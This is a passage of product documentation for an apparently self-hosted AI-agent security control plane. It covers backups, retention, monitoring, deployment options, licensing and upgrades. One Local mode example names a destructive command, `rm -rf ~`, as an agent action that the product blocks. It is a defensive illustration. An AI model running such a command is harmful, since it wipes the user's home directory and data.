on-call webhook receives the same alert, verifies the signature and opens a ticket keyed
on the delivery id.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans (dashboard) | Cloud (pg_cron + pg_net), On-prem Compose (systemd timer), Kubernetes (CronJob), Air-gapped (internal webhook or mail relay only) | Web console; receivers must be reachable from the functions runtime |

**Limitations.** Delivery is at-least-once, not exactly-once; receivers should
deduplicate on the delivery id. The latency is up to about one minute (the dispatcher
schedule); a console test send is immediate. Each channel is capped at 30 queued alerts
per minute. There is no `agent.offline` alert, no digest/batching, no per-user
preference and no mTLS to webhook receivers. E-mail needs a configured mail provider.
The DNS check and the connection resolve separately; on-prem, pair it with an egress
allow-list or proxy. Destinations are write-only, so rotating the encryption key means
re-entering them.

---

## 9. Retention, legal hold and offboarding

### Retention classes, legal holds and tenant offboarding

**What it does.** Data is kept per **data class**: temporary exports, access
credentials, telemetry, endpoint identity, security intelligence, policy configuration,
identity membership, commercial records, security audit and operational data. Each
class has its own retention. **Legal holds** freeze deletion and export. **Offboarding**
removes a tenant in phases with receipts.

**Why it matters.** Customers must be able to prove when their data is deleted, and
litigation must be able to stop that deletion.

**How it works.** `tenant_data_retention_policies` seeds the classes for each new
tenant. Telemetry follows the workspace retention setting (1 to 3,650 days, 30 by
default). `prune_expired_telemetry_events` deletes expired telemetry under the same
tenant lock as legal holds and offboarding. Offboarding revokes credentials and
admissions at once, moves the tenant to `closing` and deletes each class when its
retention ends. It keeps a tombstone and phase receipts. Posture rows cascade with their
source events, and a residue guard refuses to complete offboarding while any remain.

**How to use.** Owners close a workspace from **Settings**. Operators of a self-hosted
deployment can drive offboarding with a dry run first:
```sh
node scripts/deployment-offboarding.mjs /srv/aidr --tenant <tenant-uuid>
node scripts/deployment-offboarding.mjs /srv/aidr --tenant <tenant-uuid> --apply --requested-by <operator-user-uuid>
```

**Example.** A workspace is closed on 1 October with 30-day telemetry retention. API keys
stop working at once. Telemetry is deleted after its window, and a later export attempt
during a legal hold returns `409 legal_hold_active`.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | n/a |

**Limitations.** Backup copies are governed by the separate backup retention and key
destruction process and are never reported as deleted by offboarding. The offsite prune
command does not consult tenant legal holds, so do not prune while a hold is active.

---

## 10. Backups and restore drills

### Encrypted offsite backup and scheduled restore drill

**What it does.** For Compose installations, `deployment-backup.mjs` makes a cold,
encrypted and authenticated backup of the database and storage.
`deployment-backup-offsite.mjs` copies it to a separate filesystem or S3-compatible
target and verifies it. `deployment-restore-drill.mjs` restores the newest good backup
into an isolated project and records RPO and RTO results.

**Why it matters.** A backup that has never been restored is a hope, not a control. The
drill turns recovery into evidence.

**How it works.** The upload goes to a random staging prefix, is checked by size and
SHA-256, copied to an immutable id and downloaded again for an independent digest check.
`COMMITTED.json` is copied last, so an interrupted transfer never counts as complete.
Optional S3 Object Lock (`GOVERNANCE` or `COMPLIANCE`) makes objects WORM. The offsite
target never receives the recovery key; only a `--key-reference` such as a vault or HSM
URI is recorded. The weekly drill timer verifies the signed release candidate, restores
into owner-only temporary directories and removes all recovered material afterwards.

**How to use.**
```sh
node scripts/deployment-backup-offsite.mjs upload --backup /var/lib/aidr-backup/2026-09-12 \
  --target s3://company-backups/aidr/production --s3-region eu-central-1 \
  --key-file /run/credentials/aidr-recovery.key --key-reference hsm://security/aidr-recovery \
  --retention-days 35 --object-lock-mode COMPLIANCE --health-file /srv/aidr/health/backup.json
systemctl start aidr-restore-drill.service
```
Kubernetes installations use the chart's `backup.enabled` `pg_dump` CronJob (sealed with
age to operator recipients, optionally copied to an off-cluster S3-compatible bucket), or
the database provider's point-in-time recovery.

**Example.** The drill restores last night's backup into a new project and writes
`restore-drill-evidence.json` with target RPO 24 h and RTO 4 h and the measured values.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Self-hosted plans (Business, Enterprise) | On-prem Compose, Air-gapped (offline target); Helm: `pg_dump` CronJob only; Cloud: operated by the provider | Linux host with systemd; AWS CLI v2 for S3 targets |

**Limitations.** Deep-scan state volumes are not part of the backup. Real offsite access,
independent key custody, alert delivery and a restore on a second failure-domain host
must be proven in each customer environment.

---

## 11. Monitoring and alerts

### Readiness probes, metrics and Prometheus alerts

**What it does.** The dashboard server exposes `GET /livez` (the process answers),
`GET /readyz` (every production dependency is ready) and `GET /metrics` (Prometheus
readiness gauges and request counters behind a bearer token). `deploy/monitoring` ships
17 Prometheus alert rules.

**Why it matters.** A green container is not a working security service. `/readyz` fails
until signing, backups, the telemetry queue and TLS are actually healthy.

**How it works.** `/readyz` checks seven things by default: `database`, `storage`,
`functions`, `signing`, `backup`, `queue` and `certificate`. Production startup rejects
any subset. Signing, backup and queue health come from evidence files that producers
write atomically under `/run/aidr-health`. Metrics contain no URLs, tenant ids, key ids
or secrets. The alerts include `AIDRControlPlaneNotReady`, `AIDRDatabaseUnavailable`,
`AIDRSigningKeyExpiresSoon`, `AIDRBackupUnhealthy`, `AIDRQueueGrowing`,
`AIDRCertificateExpiresSoon` and `AIDRDashboardErrorBudgetBurn`.

**How to use.** Scrape `/metrics` with the generated `AIDR_METRICS_TOKEN`, load
`deploy/monitoring/prometheus-alerts.yml`, and route alerts to your on-call team. Run
`node scripts/deployment-doctor.mjs --deployment /srv/aidr --online` after every change.

**Example.** An offsite backup has not completed for longer than its threshold.
`/readyz` returns `503`, and `AIDRBackupUnhealthy` fires.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Self-hosted plans | On-prem Compose, Helm (the evidence worker must be run; no CronJob yet), Air-gapped; Cloud: operated by the provider | Prometheus-compatible monitoring |

**Limitations.** Evidence files are operational attestations: anyone who can write them
can fake readiness, so protect them. The Doctor reports `UNVERIFIED` when it cannot
inspect the host, and that is never a pass.

---

## 12. Deployment options

### Local mode (no control plane)

**What it does.** Connectors and Browser Guard run with local settings only. There is no
account, enrollment or network requirement for detection.

**Why it matters.** Protection starts at install time, even on a laptop that never talks
to a server, and it keeps working if the control plane or licence goes away.

**How it works.** `mode` defaults to `"local"`. Rules, allowlists, the audit log and
operator approvals (`aidr pending`, `aidr approve`) all live on the endpoint under
`~/.singularity-aidr/`.

**How to use.** Install a connector and run `aidr setup`. See
[configuration.md](../../../configuration.md).

**Example.** A contractor laptop with no corporate network still blocks
`rm -rf ~` from an agent and writes the verdict to the local audit log.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Every plan, and without any plan | Local | Windows, macOS, Linux per connector; Chrome, Edge, Firefox for Browser Guard |

**Limitations.** No central view, policy, enrollment or telemetry. Each endpoint's
settings are managed locally.

### Cloud (SaaS)

**What it does.** SingularityRD operates the dashboard, database and Edge Functions.
You get tenants, SSO and SCIM, device enrollment, signed policy with staged rollout,
signed rule and intel packs, ingest, incidents, audit export and SIEM delivery.

**Why it matters.** It gives the fastest start, with no servers to run.

**How it works.** Endpoints still enforce locally and send only the redacted data
described in [section 7](#7-telemetry-and-its-privacy). The commercial decision covers
EU, US and APAC regions, recorded as declarations in
[`deploy/regions.manifest.json`](../../../../deploy/regions.manifest.json). A region
becomes available when its hosted project, residency terms and subprocessor list are
approved.

**How to use.** Sign up where signup is open, start the trial, enroll endpoints, deploy
connectors and Browser Guard, then publish policy. See
[saas.md](../../../deployment/saas.md).

**Example.** A 10-developer team starts a trial, enrolls one agent, then requests Team
for 10 seats through Billing.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Free, Team, Business | Cloud | Web console; connectors per platform |

**Limitations.** The hosted service is not yet accepted for customer use. A 99.9% monthly
availability target was chosen for contract discussion. It is not an SLA.

### On-premises with Docker Compose

**What it does.** You run the whole control plane on one Linux host of your own.
`scripts/deployment-prepare.mjs --mode self-hosted` generates the stack from the pinned
Supabase self-hosted baseline (`v0.8.1`) plus the AIDR dashboard, with lifecycle tools
for migrate, bootstrap, doctor, backup, restore drill, upgrade, maintenance, TLS and
offboarding.

**Why it matters.** Telemetry, identities and policy stay on your network, under your
retention and your change control.

**How it works.** Preparation writes a private (`0700`) directory with `compose.yml`
(merged with `compose.onprem.overlay.yml` for restart policy, log rotation, health checks
and resource limits), `.env`, `.env.functions`, `.env.readiness` and `.env.ingress` (all
`0600`), migrations, functions, `agent-config.json` and `deployment.json`. Ports bind to
loopback, so your TLS proxy fronts them. Three **resource profiles** set per-service CPU,
memory and PID limits (see [sizing](#resource-sizing)). The optional **deep-scan
sidecar** (`--with-posture-scanner`) adds the deep-scan server, agent and bridge under
Compose profile `posture-scanner`. The bridge is published on `127.0.0.1:8099` only. Remote
scans leave only through a pinned **Squid egress gateway** that denies everything by
default. You list authorized domains in `/srv/aidr/posture-scanner/egress/allowlist.txt`.
Loopback, private, CGNAT and
reserved destinations are refused even if listed.

**How to use.**
```sh
node scripts/deployment-prepare.mjs --mode self-hosted --output /srv/aidr --profile small \
  --region self-hosted --tenant-region self-hosted \
  --dashboard-url https://aidr.customer.example --supabase-url https://api.aidr.customer.example \
  --artifact-verification-public-key-file /secure-delivery/aidr-artifact-signing-public.pem \
  --telemetry-queue-root /var/lib/aidr-telemetry
docker compose --project-directory /srv/aidr -f /srv/aidr/compose.yml up -d --build
node scripts/deployment-migrate.mjs /srv/aidr
node scripts/deployment-doctor.mjs --deployment /srv/aidr --online
```
Add `--with-posture-scanner --posture-scanner-signing-public-key-file <pem>
--posture-scanner-signing-key-id <id>` for the scanning sidecar. Every setting is listed in the
[on-prem configuration reference](../../../operations/onprem-config-reference.md)
(`pnpm onprem:config-reference`).

**Example.** A container keeps restarting with exit code 137. It hit its memory limit, so
the operator moves to `--profile medium` in the next maintenance window.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Business, Enterprise | On-prem, Air-gapped | 64-bit Linux (x86_64 or arm64) with systemd, Docker Engine with Compose, Node 24 |

**Limitations.** One host: no multi-host high availability or availability SLA. The
doctor fails until TLS, the device-start signer, evidence and backup timers and the
first account exist. The committed deep-scan data manifest is unsigned, so the bridge reports
not-ready until a release-signed manifest is deployed.

### Kubernetes with Helm

**What it does.** The chart `deploy/helm/aidr` installs the same control plane on
Kubernetes 1.25+. It runs the dashboard, an Envoy API gateway, auth, REST, storage,
functions, an optional in-cluster Postgres, a migrations hook Job, an optional backup
CronJob and the optional deep-scan stack (`postureScanner.enabled`).

**Why it matters.** Teams that run Kubernetes get chart-managed upgrades, replicas,
PodDisruptionBudgets and autoscaling, with their own HA Postgres.

**How it works.** The chart refuses weak installs. Rendering fails without existing
Secrets, with non-`https` URLs, without a TLS Secret, with a `latest` image tag, and
without complete deep-scan inputs. It never generates secrets. Every pod runs as non-root
with `seccompProfile: RuntimeDefault`, all capabilities dropped and a read-only root
filesystem. The one exception is the in-cluster Postgres filesystem. A default-deny
NetworkPolicy opens only the flows the stack needs. Egress to the internet is opt-in per
purpose. Migrations run as a `post-install` and then `pre-upgrade` hook, atomically,
with checksum verification.

**How to use.**
```bash
node deploy/helm/build-images.mjs --output .aidr-images --registry registry.example.internal --build --push
node deploy/helm/generate-secrets.mjs --output ~/aidr-credentials --namespace aidr \
  --dashboard-url https://aidr.example.com --api-url https://api.aidr.example.com \
  --artifact-verification-public-key-file release-signing.pub.pem
kubectl apply -f ~/aidr-credentials/platform-secret.yaml -f ~/aidr-credentials/functions-secret.yaml
helm install aidr deploy/helm/aidr --namespace aidr -f my-values.yaml
```
Validate with `pnpm verify:helm`. Key values: `resourcesPreset` (`small`, `medium`,
`large`), `postgresql.enabled`/`externalDatabase.*`, `storage.backend` (`file` or `s3`),
`backup.enabled`, `ingress.tlsSecretName` or `ingress.certManager.*`,
`networkPolicy.*EgressCIDRs`, `global.imageRegistry`.

**Example.** `helm install` with `dashboard.image.tag: latest` fails at render time
instead of deploying an unpinned image.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Business, Enterprise | On-prem, Air-gapped (internal registry and npm mirror) | Kubernetes 1.25+ with a NetworkPolicy-enforcing CNI, an ingress controller and a StorageClass |

**Limitations.** Not yet exercised on a live cluster, so treat the first install as a
staging rehearsal. The chart does not deploy the device-start signer; without it, use
enrollment tokens. The readiness evidence worker, SIEM delivery and export-retention
timers are not shipped as CronJobs yet. The in-cluster Postgres is a single instance
without failover.

### Air-gapped installation

**What it does.** Air-gapped installation runs the on-prem control plane and endpoints
with no internet access. Container images, endpoint packages, threat-intelligence packs
and the licence all arrive on approved media and are verified offline.

**Why it matters.** Defence, finance and public-sector networks often forbid any outbound
connection, and still need AI-agent controls.

**How it works.**
- **Images:** `scripts/build-airgap-images.mjs` saves every image of the prepared stack,
  including Dockerfile `FROM` base images for local builds, into tarballs with a SHA-256
  manifest. `--verify` re-checks the bundle offline without Docker or network.
- **Endpoint packages:** connector and CLI dependencies are vendored into the customer
  kit. The Linux connector has a signed offline fleet bundle
  (`deploy/fleet/linux/build-offline-bundle.sh`).
- **Signed intel packs:** `scripts/import-offline-pack.mjs` verifies the Ed25519
  manifest signature, file hashes and expiry. It refuses a rollback to an older version
  and equivocation (a different pack under an installed version). It then installs the
  pack for endpoints (`--target local`) or into the private `aidr-packs` bucket
  (`--target storage`).
- **Licence:** the [signed offline licence](#signed-offline-licence) is verified locally,
  with no activation server.

**How to use.**
```sh
# connected staging host
node scripts/build-airgap-images.mjs --compose .aidr-deploy/compose.yml --output .aidr-airgap --platform linux/amd64
# disconnected host
node scripts/build-airgap-images.mjs --verify --compose .aidr-deploy/compose.yml --output .aidr-airgap
docker load -i .aidr-airgap/tarballs/<name>.tar
node scripts/import-offline-pack.mjs --pack /media/aidr/aidr-intel-2026.09 \
  --trusted-keys /etc/aidr/intel-trusted-keys.json --target local
```
For Helm, push the images to an internal registry, then set `global.imageRegistry` and
`functions.npmRegistry`.

**Example.** One tarball arrives truncated. `--verify` fails with a size and SHA-256
mismatch before anything is loaded.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Enterprise (`air_gapped_deployment`) | Air-gapped | Same as Compose or Helm; containerd image store recommended so digests survive `docker load` |

**Limitations.** Delivery integrity is not publisher identity. Notarization, MDM
distribution and registry publication remain external steps. Features that need the
internet, such as invitation email, cloud IdPs and card billing, are unavailable unless
reachable internally.

### Signed offline licence

**What it does.** Self-hosted and air-gapped installations are admitted by a
vendor-signed licence file (`aidr-license-v1`). It carries the seats, validity window,
grace days, plan, deployment (`onprem` or `airgap`) and features, all under an Ed25519
signature.

**Why it matters.** The contract terms can no longer be typed in by hand, and a
disconnected site can prove its entitlement without phoning home.

**How it works.** The signature covers `aidr-license-v1\n` plus the canonical JSON
payload, so changing any term breaks it. Unknown fields are refused. Trust comes only
from `deploy/onprem/license-public-keys.json`. The shipped file has **no keys**, so every
licence is refused until the vendor-published registry for your release is installed.
Keys can be `active`, `retired` (still verifies licences issued in its window) or
`revoked`.

| State | When | Managed features | Local detection |
| --- | --- | --- | --- |
| `not_yet_valid` | before `not_before` | not admitted | enforced |
| `valid` | `not_before` ≤ now < `expires_at` | enabled | enforced |
| `grace` | up to `grace_days` (0 to 90) after expiry | enabled, with warnings | enforced |
| `expired` | after grace | degraded: capacity 0, so enrollment and ingest are refused | **enforced** |

**How to use.** The vendor issues the licence with `scripts/license-issue.mjs` in an
isolated signing environment. The private key is read from a `0600` file or
`AIDR_LICENSE_SIGNING_KEY_FILE` and never from the command line. You verify and
bootstrap with it:
```sh
node scripts/license-verify.mjs --license-file /secure-delivery/aidr-license.json
printf '%s' "$AIDR_PASSWORD" | node scripts/deployment-bootstrap.mjs \
  --deployment /srv/aidr --email owner@customer.example \
  --license-file /secure-delivery/aidr-license.json
```
`license-verify` exit codes: `0` valid, `2` grace, `3` expired, `4` not yet valid, `1`
refused. Renewals are applied by an admission operator with
`grant_licensed_tenant_admission` (see [operator-admin](#operator-administration-operator-admin)).

**Example.** A 250-seat licence expires on 1 October 2027 with 14 grace days. On
10 October `license-verify` exits `2` (grace). On 16 October the dashboard stops
receiving new endpoint telemetry, while every endpoint keeps blocking dangerous commands.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Business (on-prem), Enterprise | On-prem, Air-gapped | Node on the deployment host |

**Limitations.** A licence is a commercial control, not DRM: a root administrator can
replace the registry or database rows, and the signature and receipts show what was
issued and applied. Early revocation is an operator action. Typed pilot terms still
exist behind `--unsigned-license-for-pilot` for time-boxed pilots only.

### TLS options

**What it does.** TLS can be handled three ways: public ACME certificates with a
renewal timer, customer-supplied certificates in static mode (the usual choice for
on-prem and air-gapped hosts), or Kubernetes TLS Secrets and cert-manager.

**Why it matters.** Agents, browsers and IdPs talk to the control plane over HTTPS, and
an expired certificate stops enrollment and telemetry.

**How it works.**
- *ACME:* `deploy/ingress/aidr-tls-renew.timer` runs `scripts/deployment-tls-renew.mjs`
  with Certbot (webroot). It reloads nginx only after the chain, hostname and validity
  pass and `nginx -t` succeeds, and it writes a receipt for every attempt.
- *Static (customer CA):* `deploy/ingress/nginx.onprem.reference.conf` has separate
  dashboard and API vhosts, HSTS and security headers, TLS 1.2 and 1.3 only, no public
  `/metrics`, and it rejects unknown hostnames. `--mode static` validates the chain,
  hostname, remaining validity (`--min-days`) and key match, installs atomically, and
  restores the previous pair if the reload fails.
- *Helm:* `ingress.tlsSecretName` is mandatory, or cert-manager fills it.

**How to use.**
```sh
sudo node /srv/aidr/ingress/deployment-tls-renew.mjs --mode static \
  --hostname api.aidr.customer.example \
  --cert-file /secure-delivery/api-fullchain.pem --key-file /secure-delivery/api-key.pem
```

**Example.** An operator supplies a certificate for the wrong hostname. The tool writes a
`refused` receipt and leaves nginx untouched.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Self-hosted plans | ACME: internet-reachable on-prem. Static: On-prem, Air-gapped. Secret or cert-manager: Helm. Cloud: provider-managed | nginx 1.19.4+ on Linux |

**Limitations.** Static mode does not renew anything, so schedule replacements before
expiry. The `AIDRCertificateExpiresSoon` alert helps.

### Upgrade and rollback

**What it does.** For Compose, `scripts/deployment-upgrade.mjs` handles upgrades with
the `preflight`, `apply`, `resume` and `recover` commands, and is **signal-safe**. For
Helm, a `helm upgrade` runs migrations as a `pre-upgrade` hook.

**Why it matters.** An interrupted upgrade that leaves the schema half-applied is the
worst outage a control plane can have.

**How it works.** Preflight verifies every artifact and hash, the append-only migration
history, the configuration and a fresh encrypted backup (24 hours old at most by
default). It also dry-runs the migrations inside a rolled-back transaction. Apply stops
writers, migrates atomically under an advisory lock, installs hash-bound files, keeps
`.env` files and origins, and requires the online doctor to pass. On `SIGINT` or
`SIGTERM` it stops at the next safe point. Steps that write run to completion. Before the
schema commit it restarts the services that were running; after it, it keeps them
drained. It records the resumable phase and exits `130` or `143`. Every failed apply
writes a rollback plan.

**How to use.**
```sh
node scripts/deployment-upgrade.mjs preflight --current /srv/aidr --target /srv/aidr-target \
  --backup /backups/aidr-pre-upgrade --key-file /secure/aidr-recovery.key \
  --contract /secure/aidr-upgrade/upgrade-compatibility.json --recovery-output /srv/aidr-recovery
node scripts/deployment-upgrade.mjs apply ... --maintenance     # same options
node scripts/deployment-upgrade.mjs resume ... --maintenance    # after an interruption
```
Never rerun preparation over `/srv/aidr`. Prepare the new release in a new directory.

**Example.** A change window ends early and the operator sends one `SIGTERM` during the
file install. The tool finishes that step, records `interrupted_by`, exits `143`, and the
next `resume` continues without reapplying migrations.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Self-hosted plans | On-prem Compose, Air-gapped; Helm via `helm upgrade` | Linux host (Compose); Helm 3 (Kubernetes) |

**Limitations.** Migrations are forward-only. After the schema commits, rollback means
restoring the backup into a new isolated project (`recover`), not a down-migration. On
Helm, `helm rollback` restores manifests, not the schema.

### Resource sizing

Starting budgets from `deploy/onprem/resource-profile.json`,
`deploy/RESOURCE_REQUIREMENTS.md` and the Helm values. They are not a capacity promise:
validate with your own load and soak tests.

| Where | Profile | Starting point | Extra for the deep-scan sidecar |
| --- | --- | --- | --- |
| Compose host | `small` (default): pilot, up to about 100 endpoints | 4 vCPU, 8 GiB RAM, 100 GiB SSD | +4 vCPU, 6 GiB, 40 GiB |
| Compose host | `medium`: load-test start for about 1,000 endpoints | 8 vCPU, 16 GiB RAM, 250 GiB SSD | +6 vCPU, 8 GiB, 60 GiB |
| Compose host | `large`: dedicated host for multi-thousand endpoint tests | 16 vCPU, 32 GiB RAM, 500 GiB SSD | +8 vCPU, 12 GiB, 100 GiB |
| Kubernetes | `resourcesPreset: small` (evaluation, under 250 seats), `medium` (x2, under 2,500 seats), `large` (x4) | Requests and limits per component | `postureScanner.*` components |
| Endpoint | per protected device | Reserve 512 MiB disk (packages, 64 MiB default event queue, feed, logs) | n/a |

Planning model for telemetry, assuming 2 KiB events, 90-day retention and a peak of 10x
the daily average. Replace these assumptions with real customer data:

| Devices | Policy + ingest calls per day | Payload per day | 90-day event storage | Planning peak |
| ---: | ---: | ---: | ---: | ---: |
| 10 | 700 | 2.5 MiB | 0.05 GiB | 1 RPS |
| 100 | 14,000 | 50.8 MiB | 1.03 GiB | 2 RPS |
| 1,000 | 400,000 | 1.45 GiB | 20.6 GiB | 47 RPS |

---

## 13. Deployment x feature matrix

| Feature | Local mode | Cloud (SaaS) | On-prem Compose | Kubernetes (Helm) | Air-gapped |
| --- | --- | --- | --- | --- | --- |
| Local detection and enforcement | Yes | Yes | Yes | Yes | Yes |
| Dashboard (web console) | - | Yes | Yes | Yes | Yes |
| Trial sign-up | - | Yes | - | - | - |
| Device-code enrollment | - | Yes | Yes (with signer) | Signer not in chart; use enrollment tokens or add it | Yes (with signer) |
| API keys and enrollment tokens | - | Yes | Yes | Yes | Yes |
| Runtime policy, rollout, DLP editor | Local policy file only | Yes | Yes | Yes | Yes |
| Browser Privacy reporting | Extension masks locally, no report | Yes | Yes | Yes | Yes |
| AI Security Posture page | Scanners run locally, no page | Yes | Yes | Yes | Yes (internal targets) |
| Dashboard approvals, AI register, change control, governance scorecard | Terminal approvals only | Yes | Yes | Yes | Yes |
| Deep-scan sidecar | Optional loopback bridge | Not listed for the hosted service | Optional `--with-posture-scanner` | Optional `postureScanner.enabled` | Optional; remote scans only via egress allowlist |
| Entra ID SSO | - | Yes | Yes | Yes | Only if the IdP is reachable internally |
| SAML 2.0 | - | Yes | Yes (Auth configured for SAML) | Yes (`dashboard.saml.*`) | With an internal IdP |
| SCIM | - | Yes | Yes | Yes | Yes (IdP must reach the API) |
| MFA, recovery codes, session revocation | - | Yes | Yes | Yes | Yes |
| Invitation email | - | When a mail provider is configured | Needs egress to the provider; otherwise manual link | Same as Compose | Manual link |
| Audit export (CSV/JSON) | Local JSONL audit log | Yes | Yes | Yes | Yes |
| SIEM delivery | - | Listed for the hosted service | Yes (systemd timer) | Not yet a CronJob | Yes (internal SIEM) |
| Alert integrations (Slack, Teams, webhooks, e-mail) | - | Yes (pg_cron dispatcher) | Yes (systemd timer) | Yes (CronJob, opt-in) | Internal webhooks or mail relay only |
| Card billing (Stripe) | - | Only when self-service is enabled | - | - | - |
| Invoice and operator licence | - | Yes | Yes | Yes | Yes |
| Signed offline licence | - | - | Yes | Yes | Yes |
| Offline signed intel packs | Endpoint import (`--target local`) | Signed feed and packs download | Yes (`--target storage`) | Endpoint import; storage import expects a Compose directory | Yes |
| Encrypted offsite backup and restore drill | - | Provider-operated | Yes | `pg_dump` CronJob; provider PITR | Yes (offline target) |
| `/readyz`, `/metrics`, Prometheus alerts | - | Provider-operated | Yes | Yes (run the evidence worker) | Yes |
| Signal-safe upgrade tool | - | Provider-operated | Yes | `helm upgrade` with pre-upgrade migrations | Yes |
| TLS | - | Provider-managed | ACME timer or static customer certificate | TLS Secret or cert-manager | Static customer certificate |
| Operator admin CLI | - | SingularityRD operators | Customer operators | Customer operators | Customer operators |

---

## 14. Related documents

- [Control plane](../../../control-plane.md), [billing](../../../billing.md), [pricing](../../../pricing.md)
- [Cloud deployment](../../../deployment/saas.md), [on-prem deployment](../../../deployment/onprem.md)
- [On-prem installation](../../../../deploy/onprem/README.md), [installation and verification](../../../../deploy/README.md), [first-customer guide](../../../../deploy/FIRST_CUSTOMER.md)
- [Kubernetes operations](../../../operations/kubernetes.md), [Helm chart](../../../../deploy/helm/aidr/README.md)
- [Licensing](../../../operations/licensing.md), [operator administration](../../../operations/operator-admin.md), [admission operators](../../../operations/admission-operators.md)
- [Upgrade runbook](../../../../deploy/UPGRADE.md), [backup runbook](../../../../deploy/backup/README.md), [monitoring](../../../../deploy/monitoring/README.md), [scheduled maintenance](../../../../deploy/maintenance/README.md), [ingress and TLS](../../../../deploy/ingress/README.md)
- [AI Security Posture](../../../ai-security-posture.md), [threat-intelligence sync and air-gapped updates](../../../operations/threat-sync.md)
- [Privacy and telemetry data flow](../../../privacy.md), [privacy telemetry contract](../../../contracts/privacy-telemetry.md), [alert notification contract](../../../contracts/notifications.md), [device authorization](../../../device-auth.md)
- [Response playbooks](../../../operations/response-playbooks.md), [recovery codes](../../../security/recovery-codes.md)
- [Product overview](../../overview.md)
